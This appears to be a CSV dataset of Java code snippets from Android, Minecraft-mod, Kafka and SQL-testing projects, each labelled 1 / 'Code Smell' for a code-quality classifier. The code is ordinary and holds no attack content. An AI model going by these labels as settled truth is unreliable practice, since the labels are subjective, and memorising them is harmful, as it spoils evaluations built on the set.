text,label,text_label
"private void execute(ArrayList<Runnable> runnables){
  for (int i=0; i < runnables.size(); i++) {
    Runnable runnable=runnables.get(i);
    if (runnable == null) {
      continue;
    }
    DispatchQueue queue;
    if (!busyQueues.isEmpty() && (totalTasksCount / 2 <= busyQueues.size() || queues.isEmpty() && createdCount >= maxCount)) {
      queue=busyQueues.remove(0);
    }
 else     if (queues.isEmpty()) {
      queue=new DispatchQueue(THREAD_PREFIX + guid + ""_""+ Utilities.random.nextInt());
      queue.setPriority(Thread.MAX_PRIORITY);
      createdCount++;
    }
 else {
      queue=queues.remove(0);
    }
    if (!cleanupScheduled) {
      Utilities.globalQueue.postRunnable(cleanupRunnable,30000);
      cleanupScheduled=true;
    }
    totalTasksCount++;
    busyQueues.add(queue);
    int count=busyQueuesMap.get(queue.index,0);
    busyQueuesMap.put(queue.index,count + 1);
    queue.postRunnable(() -> {
      runnable.run();
      Utilities.globalQueue.postRunnable(() -> {
        totalTasksCount--;
        int remainingTasksCount=busyQueuesMap.get(queue.index) - 1;
        if (remainingTasksCount == 0) {
          busyQueuesMap.delete(queue.index);
          busyQueues.remove(queue);
          queues.add(queue);
        }
 else {
          busyQueuesMap.put(queue.index,remainingTasksCount);
        }
      }
);
    }
);
  }
}
@UiThread public static void execute(Runnable runnable){
  execute(runnable,false);
}
@UiThread public static void execute(Runnable runnable,boolean now){
  if (Thread.currentThread() != ApplicationLoader.applicationHandler.getLooper().getThread()) {
    if (BuildVars.DEBUG_VERSION) {
      FileLog.e(new RuntimeException(""wrong thread""));
    }
    return;
  }
  if (updateTaskCollection == null) {
    if (!freeCollections.isEmpty()) {
      updateTaskCollection=freeCollections.remove(freeCollections.size() - 1);
    }
 else {
      updateTaskCollection=new ArrayList<>(100);
    }
    if (!now) {
      AndroidUtilities.runOnUIThread(finishCollectUpdateRunnable);
    }
  }
  updateTaskCollection.add(runnable);
  if (now) {
    AndroidUtilities.cancelRunOnUIThread(finishCollectUpdateRunnable);
    finishCollectUpdateRunnable.run();
  }
}",1,Code Smell
"@Test public void testSelect(){
  tester.check(""select * from (values(1))"",SqlTests.INTEGER_TYPE_CHECKER,""1"",0);
  if (Bug.FRG189_FIXED || (getClass() != SqlOperatorTest.class) && Bug.TODO_FIXED) {
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES(1))) FROM (VALUES(2))"",""RecordType(INTEGER NOT NULL EXPR$0, INTEGER EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES(CAST(10 as BIGINT)))) "" + ""FROM (VALUES(CAST(10 as bigint)))"",""RecordType(BIGINT NOT NULL EXPR$0, BIGINT EXPR$1) NOT NULL"");
    tester.checkType("" SELECT *,(SELECT * FROM (VALUES(10.5))) FROM (VALUES(10.5))"",""RecordType(DECIMAL(3, 1) NOT NULL EXPR$0, DECIMAL(3, 1) EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES('this is a char'))) "" + ""FROM (VALUES('this is a char too'))"",""RecordType(CHAR(18) NOT NULL EXPR$0, CHAR(14) EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES(true))) FROM (values(false))"",""RecordType(BOOLEAN NOT NULL EXPR$0, BOOLEAN EXPR$1) NOT NULL"");
    tester.checkType("" SELECT *,(SELECT * FROM (VALUES(cast('abcd' as varchar(10))))) "" + ""FROM (VALUES(CAST('abcd' as varchar(10))))"",""RecordType(VARCHAR(10) NOT NULL EXPR$0, VARCHAR(10) EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,"" + ""  (SELECT * FROM (VALUES(TIMESTAMP '2006-01-01 12:00:05'))) "" + ""FROM (VALUES(TIMESTAMP '2006-01-01 12:00:05'))"",""RecordType(TIMESTAMP(0) NOT NULL EXPR$0, TIMESTAMP(0) EXPR$1) NOT NULL"");
  }
}",1,Code Smell
"@Override public void checkRepeatData(CfCarParkLinkUser cfCarParkLinkUser){
  CfCarParkLinkUserQuery cfCarParkLinkUserQuery=new CfCarParkLinkUserQuery();
  cfCarParkLinkUserQuery.setUid(cfCarParkLinkUser.getUid());
  cfCarParkLinkUserQuery.setCarParkId(cfCarParkLinkUser.getCarParkId());
  cfCarParkLinkUserQuery.setPage(1);
  cfCarParkLinkUserQuery.setSize(1);
  List<CfCarParkLinkUser> cfCarParkLinkUsers=getListByQuery(cfCarParkLinkUserQuery);
  if (cfCarParkLinkUsers != null && cfCarParkLinkUsers.size() > 0) {
    if ((StringUtils.isNotEmpty(cfCarParkLinkUser.getId()) && !cfCarParkLinkUsers.get(0).getId().equals(cfCarParkLinkUser.getId())) || StringUtils.isEmpty(cfCarParkLinkUser.getId())) {
      ExceptionCast.cast(CommonCode.DUPLICATE_DATA);
    }
  }
}",1,Code Smell
"private int scrollOffsetForQuote(MessageObject object){
  if (TextUtils.isEmpty(highlightMessageQuote) || object == null) {
    if (dummyMessageCell != null) {
      dummyMessageCell.computedGroupCaptionY=0;
      dummyMessageCell.computedCaptionLayout=null;
    }
    return 0;
  }
  int offsetY;
  CharSequence text;
  ArrayList<MessageObject.TextLayoutBlock> textLayoutBlocks;
  if (!TextUtils.isEmpty(object.caption) && dummyMessageCell != null && dummyMessageCell.captionLayout != null) {
    offsetY=(int)dummyMessageCell.captionY;
    text=object.caption;
    textLayoutBlocks=dummyMessageCell.captionLayout.textLayoutBlocks;
  }
 else {
    offsetY=0;
    text=object.messageText;
    textLayoutBlocks=object.textLayoutBlocks;
    if (dummyMessageCell != null && dummyMessageCell.linkPreviewAbove) {
      offsetY+=dummyMessageCell.linkPreviewHeight + dp(10);
    }
  }
  if (dummyMessageCell != null) {
    dummyMessageCell.computedGroupCaptionY=0;
    dummyMessageCell.computedCaptionLayout=null;
  }
  if (textLayoutBlocks == null || text == null) {
    return 0;
  }
  int index=MessageObject.findQuoteStart(text.toString(),highlightMessageQuote,highlightMessageQuoteOffset);
  if (index < 0) {
    return 0;
  }
  for (int i=0; i < textLayoutBlocks.size(); ++i) {
    MessageObject.TextLayoutBlock block=textLayoutBlocks.get(i);
    StaticLayout layout=block.textLayout;
    String layoutText=layout.getText().toString();
    if (index > block.charactersOffset) {
      final float y;
      if (index - block.charactersOffset > layoutText.length() - 1) {
        y=offsetY + (int)(block.textYOffset + block.padTop + block.height);
      }
 else {
        y=offsetY + block.textYOffset + block.padTop+ layout.getLineTop(layout.getLineForOffset(index - block.charactersOffset));
      }
      if (y > AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f)) {
        return (int)(y - AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f));
      }
      return 0;
    }
  }
  return 0;
}",1,Code Smell
"@Override public void mouseClicked(MouseEvent e){
  if (locationToIndex(e.getPoint()) == -1 && !e.isShiftDown() && !isMenuShortcutKeyDown(e)) {
    clearSelection();
  }
}",1,Code Smell
"private int detectFastMove(final int x,final int y,final int time){
  final int size=getLength();
  final int lastIndex=size - 1;
  final int lastX=mXCoordinates.get(lastIndex);
  final int lastY=mYCoordinates.get(lastIndex);
  final int dist=getDistance(lastX,lastY,x,y);
  final int msecs=time - mEventTimes.get(lastIndex);
  if (msecs > 0) {
    final int pixels=getDistance(lastX,lastY,x,y);
    final int pixelsPerSec=pixels * MSEC_PER_SEC;
    if (DEBUG_SPEED) {
      final float speed=(float)pixelsPerSec / msecs / mKeyWidth;
      Log.d(TAG,String.format(Locale.US,""[%d] detectFastMove: speed=%5.2f"",mPointerId,speed));
    }
    if (!hasDetectedFastMove() && pixelsPerSec > mDetectFastMoveSpeedThreshold * msecs) {
      if (DEBUG) {
        final float speed=(float)pixelsPerSec / msecs / mKeyWidth;
        Log.d(TAG,String.format(Locale.US,""[%d] detectFastMove: speed=%5.2f T=%3d points=%3d fastMove"",mPointerId,speed,time,size));
      }
      mDetectFastMoveTime=time;
      mDetectFastMoveX=x;
      mDetectFastMoveY=y;
    }
  }
  return dist;
}",1,Code Smell
"public boolean canTranslatePhoto(MessageObject messageObject,String detectedLanguage){
  if (messageObject != null && messageObject.messageOwner != null && messageObject.messageOwner.originalLanguage != null) {
    detectedLanguage=messageObject.messageOwner.originalLanguage;
  }
  return messageObject != null && messageObject.messageOwner != null && !TextUtils.isEmpty(messageObject.messageOwner.message) && (detectedLanguage == null && messageObject.messageOwner.translatedText != null && TextUtils.equals(messageObject.messageOwner.translatedToLanguage,TranslateAlert2.getToLanguage()) || detectedLanguage != null && !RestrictedLanguagesSelectActivity.getRestrictedLanguages().contains(messageObject.messageOwner.originalLanguage)) && !messageObject.translated;
}",1,Code Smell
"@Override @SuppressWarnings(""ReferenceEquality"") public void onTracksChanged(TrackGroupArray trackGroups,TrackSelectionArray trackSelections){
  updateButtonVisibility();
  if (trackGroups != lastSeenTrackGroupArray) {
    MappedTrackInfo mappedTrackInfo=trackSelector.getCurrentMappedTrackInfo();
    if (mappedTrackInfo != null) {
      if (mappedTrackInfo.getTypeSupport(C.TRACK_TYPE_VIDEO) == MappedTrackInfo.RENDERER_SUPPORT_UNSUPPORTED_TRACKS) {
        showToast(R.string.error_unsupported_video);
      }
      if (mappedTrackInfo.getTypeSupport(C.TRACK_TYPE_AUDIO) == MappedTrackInfo.RENDERER_SUPPORT_UNSUPPORTED_TRACKS) {
        showToast(R.string.error_unsupported_audio);
      }
    }
    lastSeenTrackGroupArray=trackGroups;
  }
}
",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public void visitConstant(int opcode,int offset,int length,Constant cst,int value){
  visitCommon(offset,length,true);
  if (cst instanceof CstMemberRef || cst instanceof CstType || cst instanceof CstString|| cst instanceof CstInvokeDynamic|| cst instanceof CstMethodHandle|| cst instanceof CstProtoRef) {
    visitThrowing(offset,length,true);
  }
}
",1,Code Smell
"private Result<Boolean> updateZKAcl(KafkaZkClient kafkaZkClient,ResourcePattern resourcePattern,AclEntry aclEntry,boolean deleteAcl){
  AclAuthorizer.VersionedAcls versionedAcls=kafkaZkClient.getVersionedAclsForResource(resourcePattern);
  Set<AclEntry> aclEntrySet=new HashSet<>(CollectionConverters.asJava(versionedAcls.acls()));
  if ((deleteAcl && !aclEntrySet.contains(aclEntry)) || (!deleteAcl && aclEntrySet.contains(aclEntry))) {
    return Result.buildSuc(Boolean.TRUE);
  }
  if (deleteAcl) {
    aclEntrySet.remove(aclEntry);
  }
 else {
    aclEntrySet.add(aclEntry);
  }
  if (aclEntrySet.isEmpty()) {
    return kafkaZkClient.deleteResource(resourcePattern) ? Result.buildSuc(Boolean.TRUE) : Result.buildSuc(Boolean.FALSE);
  }
 else   if (ZkVersion.UnknownVersion() == versionedAcls.zkVersion()) {
    return (boolean)kafkaZkClient.createAclsForResourceIfNotExists(resourcePattern,CollectionConverters.asScala(aclEntrySet).toSet())._1() ? Result.buildSuc(Boolean.TRUE) : Result.buildSuc(Boolean.FALSE);
  }
 else {
    return (boolean)kafkaZkClient.conditionalSetAclsForResource(resourcePattern,CollectionConverters.asScala(aclEntrySet).toSet(),versionedAcls.zkVersion())._1() ? Result.buildSuc(Boolean.TRUE) : Result.buildSuc(Boolean.FALSE);
  }
}",1,Code Smell
"/** 
 * Asserts  {@link SampleQueue#read} is behaving correctly, given there are no samples to read andthe last format to be written to the sample queue is  {@code endFormat}.
 * @param endFormat The last format to be written to the sample queue, or null of no format hasbeen written.
 */
private void assertNoSamplesToRead(Format endFormat){
  assertReadNothing(false);
  if (endFormat == null) {
    assertReadNothing(true);
  }
 else {
    assertReadFormat(true,endFormat);
  }
  assertReadEndOfStream(false);
  assertReadEndOfStream(true);
  assertReadNothing(false);
  if (endFormat == null) {
    assertReadNothing(true);
  }
 else {
    assertReadFormat(true,endFormat);
  }
}
",1,Code Smell
"@Override public void onInitializeAccessibilityNodeInfo(AccessibilityNodeInfo info){
  super.onInitializeAccessibilityNodeInfo(info);
  if (getImageReceiver().hasNotThumb()) {
    info.setText(LocaleController.getString(""AccDescrProfilePicture"",R.string.AccDescrProfilePicture));
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
      info.addAction(new AccessibilityNodeInfo.AccessibilityAction(AccessibilityNodeInfo.ACTION_CLICK,LocaleController.getString(""Open"",R.string.Open)));
      info.addAction(new AccessibilityNodeInfo.AccessibilityAction(AccessibilityNodeInfo.ACTION_LONG_CLICK,LocaleController.getString(""AccDescrOpenInPhotoViewer"",R.string.AccDescrOpenInPhotoViewer)));
    }
  }
 else {
    info.setVisibleToUser(false);
  }
}
@Override public void onInitializeAccessibilityNodeInfo(AccessibilityNodeInfo info){
  super.onInitializeAccessibilityNodeInfo(info);
  if (isFocusable() && (nameTextViewRightDrawableContentDescription != null || nameTextViewRightDrawable2ContentDescription != null)) {
    StringBuilder s=new StringBuilder(getText());
    if (nameTextViewRightDrawable2ContentDescription != null) {
      if (s.length() > 0)       s.append("", "");
      s.append(nameTextViewRightDrawable2ContentDescription);
    }
    if (nameTextViewRightDrawableContentDescription != null) {
      if (s.length() > 0)       s.append("", "");
      s.append(nameTextViewRightDrawableContentDescription);
    }
    info.setText(s);
  }
}",1,Code Smell
"public static void setEpicenterCallback(Object transition,final TransitionEpicenterCallback callback){
  if (Build.VERSION.SDK_INT >= 21) {
    if (callback == null) {
      ((Transition)transition).setEpicenterCallback(null);
    }
 else {
      ((Transition)transition).setEpicenterCallback(new Transition.EpicenterCallback(){
        @Override public Rect onGetEpicenter(        Transition transition11){
          return callback.onGetEpicenter(transition11);
        }
      }
);
    }
  }
}",1,Code Smell
"@Override public void render(ForgeGui gui,GuiGraphics graphics,float partialTicks,int width,int height){
  Minecraft mc=Minecraft.getInstance();
  if (mc.options.hideGui || mc.gameMode.getPlayerMode() == GameType.SPECTATOR)   return;
  if (TrackPlacement.hoveringPos == null)   return;
  if (TrackPlacement.cached == null || TrackPlacement.cached.curve == null || !TrackPlacement.cached.valid)   return;
  if (TrackPlacement.extraTipWarmup < 4)   return;
  if (ObfuscationReflectionHelper.getPrivateValue(Gui.class,gui,""f_92993_"") instanceof Integer && toolHighlightTimer > 0)   return;
  boolean active=mc.options.keySprint.isDown();
  MutableComponent text=Lang.translateDirect(""track.hold_for_smooth_curve"",Components.keybind(""key.sprint"").withStyle(active ? ChatFormatting.WHITE : ChatFormatting.GRAY));
  Window window=mc.getWindow();
  int x=(window.getGuiScaledWidth() - gui.getFont().width(text)) / 2;
  int y=window.getGuiScaledHeight() - 61;
  Color color=new Color(0x4ADB4A).setAlpha(Mth.clamp((TrackPlacement.extraTipWarmup - 4) / 3f,0.1f,1));
  graphics.drawString(gui.getFont(),text,x,y,color.getRGB(),false);
}",1,Code Smell
"public static JsonNode getChildQueues(JsonNode resp){
  JsonNode queues=resp.get(""childQueues"").get(""queue"");
  if (queues != null && !queues.isNull() && !queues.isMissingNode() && queues.isArray() && queues.size() > 0) {
    return queues;
  }
 else {
    return resp.get(""childQueues"");
  }
}",1,Code Smell
"@Override public void tick(){
  super.tick();
  if (level.isClientSide) {
    createFluidParticles();
    tickVisualizedOutputs();
    ingredientRotationSpeed.tickChaser();
    ingredientRotation.setValue(ingredientRotation.getValue() + ingredientRotationSpeed.getValue());
  }
  if ((!spoutputBuffer.isEmpty() || !spoutputFluidBuffer.isEmpty()) && !level.isClientSide)   tryClearingSpoutputOverflow();
  if (!contentsChanged)   return;
  contentsChanged=false;
  getOperator().ifPresent(be -> be.basinChecker.scheduleUpdate());
  for (  Direction offset : Iterate.horizontalDirections) {
    BlockPos toUpdate=worldPosition.above().relative(offset);
    BlockState stateToUpdate=level.getBlockState(toUpdate);
    if (stateToUpdate.getBlock() instanceof BasinBlock && stateToUpdate.getValue(BasinBlock.FACING) == offset.getOpposite()) {
      BlockEntity be=level.getBlockEntity(toUpdate);
      if (be instanceof BasinBlockEntity)       ((BasinBlockEntity)be).contentsChanged=true;
    }
  }
}
",1,Code Smell
